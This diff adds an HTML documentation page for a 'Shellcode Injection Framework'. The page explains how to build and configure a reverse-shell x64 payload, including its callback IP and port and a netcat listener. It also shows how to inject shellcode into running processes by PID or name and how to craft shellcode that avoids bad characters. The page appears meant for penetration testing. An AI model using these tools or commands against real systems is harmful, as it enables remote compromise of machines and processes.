@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shellcode Injection Framework</title>
+    <style>
+        :root {
+            --primary-color: #1a1a1a;
+            --secondary-color: #2c3e50;
+            --accent-color: #3498db;
+            --code-bg: #282c34;
+            --text-color: #333;
+            --code-text: #f8f8f2;
+            --border-color: #ddd;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+        }
+
+        h2 {
+            margin-top: 30px;
+            margin-bottom: 15px;
+            color: var(--secondary-color);
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 10px;
+        }
+
+        p {
+            margin-bottom: 15px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            background-color: #f5f5f5;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-size: 0.9em;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        .sidebar {
+            flex: 0 0 250px;
+            position: sticky;
+            top: 20px;
+            height: fit-content;
+            margin-right: 30px;
+        }
+
+        .main-content {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .nav {
+            list-style: none;
+            margin-top: 20px;
+        }
+
+        .nav li {
+            margin-bottom: 10px;
+        }
+
+        .nav a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            font-weight: 500;
+            display: block;
+            padding: 8px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .nav a:hover {
+            background-color: #f5f5f5;
+            color: var(--accent-color);
+        }
+
+        ol, ul {
+            margin-left: 25px;
+            margin-bottom: 15px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        .terminal {
+            background-color: #000;
+            color: #0f0;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+
+        .warning {
+            background-color: #ffeaa7;
+            border-left: 4px solid #fdcb6e;
+            padding: 10px 15px;
+            margin: 15px 0;
+            border-radius: 0 5px 5px 0;
+        }
+
+        .component {
+            background-color: #f8f9fa;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .component h3 {
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            .sidebar {
+                flex: 1 1 100%;
+                position: static;
+                margin-right: 0;
+                margin-bottom: 20px;
+            }
+            .nav {
+                display: flex;
+                flex-wrap: wrap;
+            }
+            .nav li {
+                margin-right: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Shellcode Injection Framework</h1>
+        <p>A comprehensive toolkit for creating, analyzing, and injecting shellcode for security research and penetration testing</p>
+    </header>
+
+    <div class="container">
+        <aside class="sidebar">
+            <h2>Navigation</h2>
+            <ul class="nav">
+                <li><a href="#overview">Overview</a></li>
+                <li><a href="#building">Building the Framework</a></li>
+                <li><a href="#reverse-shell">Reverse Shell Payload</a></li>
+                <li><a href="#extractor">Shellcode Extractor</a></li>
+                <li><a href="#injector">Shellcode Injector</a></li>
+                <li><a href="#loader">Shellcode Loader</a></li>
+                <li><a href="#tips">Tips for Effective Shellcode</a></li>
+                <li><a href="#security">Security Considerations</a></li>
+                <li><a href="#debugging">Debugging</a></li>
+            </ul>
+        </aside>
+
+        <main class="main-content">
+            <section id="overview">
+                <h2>Overview</h2>
+                <p>This framework provides a comprehensive toolkit for creating, analyzing, and injecting shellcode for security research and penetration testing purposes.</p>
+                
+                <p>The framework consists of the following components:</p>
+                
+                <div class="component">
+                    <h3>Reverse Shell Payload</h3>
+                    <p>Position-independent x64 assembly shellcode that establishes a reverse shell connection.</p>
+                </div>
+                
+                <div class="component">
+                    <h3>Shellcode Extractor</h3>
+                    <p>Utility to extract shellcode from ELF binaries for use in exploits.</p>
+                </div>
+                
+                <div class="component">
+                    <h3>Shellcode Injector</h3>
+                    <p>Tool for injecting shellcode into processes using various methods.</p>
+                </div>
+                
+                <div class="component">
+                    <h3>Shellcode Loader</h3>
+                    <p>Test environment for executing and analyzing shellcode in a controlled setting.</p>
+                </div>
+            </section>
+
+            <section id="building">
+                <h2>Building the Framework</h2>
+                <p>Use the following commands to build the framework and its components:</p>
+                
+                <pre>
+# Build all components
+make
+
+# Build individual components
+make reverse_shell
+make shellcode_extractor
+make shellcode_injector
+make shellcode_loader
+
+# Build loader with embedded shellcode
+make shellcode_loader_embedded</pre>
+            </section>
+
+            <section id="reverse-shell">
+                <h2>Using the Reverse Shell Payload</h2>
+                <p>The reverse shell connects back to the specified IP address and port, providing remote shell access.</p>
+                
+                <ol>
+                    <li>
+                        <p>Edit the IP address and port in <code>reverse_shell.asm</code> to match your listener:</p>
+                        <pre>
+; IP address (default: 192.168.1.10 = 0x0a01a8c0)
+mov dword [rsp-4], 0x0a01a8c0
+
+; Port (default: 4444 = 0x5c11)
+mov word [rsp-2], 0x5c11</pre>
+                    </li>
+                    <li>
+                        <p>Build the payload:</p>
+                        <pre>make reverse_shell</pre>
+                    </li>
+                    <li>
+                        <p>Set up a netcat listener on the target IP and port:</p>
+                        <pre>nc -lvp 4444</pre>
+                    </li>
+                </ol>
+            </section>
+
+            <section id="extractor">
+                <h2>Using the Shellcode Extractor</h2>
+                <p>The extractor converts ELF binaries to shellcode format for use in exploits.</p>
+                
+                <pre>
+# Extract shellcode from an ELF binary
+./shellcode_extractor reverse_shell shellcode.h
+
+# Display usage information
+./shellcode_extractor</pre>
+            </section>
+
+            <section id="injector">
+                <h2>Using the Shellcode Injector</h2>
+                <p>The injector allows you to inject shellcode into running processes.</p>
+                
+                <pre>
+# Inject into your own process (for testing)
+./shellcode_injector --self --shellcode shellcode.bin
+
+# Inject into another process by PID
+./shellcode_injector --pid 1234 --shellcode shellcode.bin
+
+# Inject into a process by name
+./shellcode_injector --process-name firefox --shellcode shellcode.bin
+
+# Launch an executable and inject shellcode
+./shellcode_injector --exec /bin/sleep --shellcode shellcode.bin
+
+# Additional options
+./shellcode_injector --help</pre>
+            </section>
+
+            <section id="loader">
+                <h2>Using the Shellcode Loader</h2>
+                <p>The loader allows you to test shellcode in a controlled environment.</p>
+                
+                <pre>
+# Execute shellcode from a file
+./shellcode_loader --file shellcode.bin
+
+# Analyze shellcode for bad characters
+./shellcode_loader --file shellcode.bin --analyze
+
+# Dump shellcode in hex format
+./shellcode_loader --file shellcode.bin --dump
+
+# Execute with verbose output
+./shellcode_loader --file shellcode.bin --execute --verbose
+
+# Display usage information
+./shellcode_loader --help</pre>
+            </section>
+
+            <section id="tips">
+                <h2>Tips for Creating Effective Shellcode</h2>
+                <ol>
+                    <li>
+                        <strong>Avoid NULL bytes (0x00)</strong> - These often terminate string operations and can break shellcode execution.
+                    </li>
+                    <li>
+                        <strong>Minimize size</strong> - Smaller shellcode has better chances of fitting into limited buffer spaces.
+                    </li>
+                    <li>
+                        <strong>Use position-independent code</strong> - Shellcode should execute correctly regardless of its location in memory.
+                    </li>
+                    <li>
+                        <strong>Avoid other bad characters</strong> depending on the context:
+                        <ul>
+                            <li>0x0A (newline)</li>
+                            <li>0x0D (carriage return)</li>
+                            <li>0x20 (space)</li>
+                            <li>0xFF (may be interpreted as an EOF marker)</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Test thoroughly</strong> in a controlled environment before deployment.
+                    </li>
+                </ol>
+            </section>
+
+            <section id="security">
+                <h2>Security Considerations</h2>
+                <div class="warning">
+                    <p>This framework is provided for educational purposes and legitimate security testing only. Unauthorized use against systems without explicit permission is illegal and unethical.</p>
+                </div>
+            </section>
+
+            <section id="debugging">
+                <h2>Debugging</h2>
+                <p>When testing shellcode, use the analyzer first to check for potential issues:</p>
+                
+                <pre>./shellcode_loader --file shellcode.bin --analyze</pre>
+                
+                <p>For more detailed debugging, you can use GDB with the shellcode loader:</p>
+                
+                <pre>gdb --args ./shellcode_loader --file shellcode.bin</pre>
+                
+                <p>Common GDB commands for shellcode debugging:</p>
+                <ul>
+                    <li><code>break main</code> - Set breakpoint at main</li>
+                    <li><code>run</code> - Start execution</li>
+                    <li><code>disassemble</code> - View assembly code</li>
+                    <li><code>x/64bx $rip</code> - Examine memory at current instruction pointer</li>
+                    <li><code>stepi</code> - Execute single instruction</li>
+                </ul>
+            </section>
+        </main>
+    </div>
+
+    <footer style="margin-top: 40px; text-align: center; color: #888; border-top: 1px solid var(--border-color); padding-top: 20px;">
+        <p>Shellcode Injection Framework Documentation</p>
+    </footer>
+
+    <script>
+        // Add smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+
+        // Highlight current section in navigation
+        window.addEventListener('scroll', function() {
+            const sections = document.querySelectorAll('section');
+            const navItems = document.querySelectorAll('.nav a');
+            
+            let current = '';
+            
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 100) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navItems.forEach(item => {
+                item.style.fontWeight = '500';
+                if (item.getAttribute('href') === `#${current}`) {
+                    item.style.fontWeight = '700';
+                    item.style.color = 'var(--accent-color)';
+                } else {
+                    item.style.color = 'var(--secondary-color)';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
